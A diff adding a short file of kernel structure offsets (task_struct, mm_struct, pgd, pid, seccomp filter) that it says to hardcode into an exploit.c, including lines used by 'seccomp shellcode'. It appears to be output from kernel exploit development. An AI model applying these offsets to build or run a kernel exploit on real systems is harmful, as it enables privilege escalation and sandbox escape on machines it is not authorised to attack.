@@ -1,0 +1,12 @@
+=== Update exploit.c with these values ===
+
+Using cached task_struct output
+Using cached mm_struct output
+Line 122: #define OFFSETOF_TASK_STRUCT_MM 0x4e0
+Line 123: #define OFFSETOF_MM_PGD 0x40
+
+Hardcoded offsets in exploit.c:
+Line 1098, 1108: task_struct->tasks = 0x490
+Line 1112: task_struct->pid = 0x590
+Line 1724 (seccomp shellcode): task_struct->seccomp = 0x7f8
+Line 1725 (seccomp shellcode): task_struct->seccomp.filter = 0x800
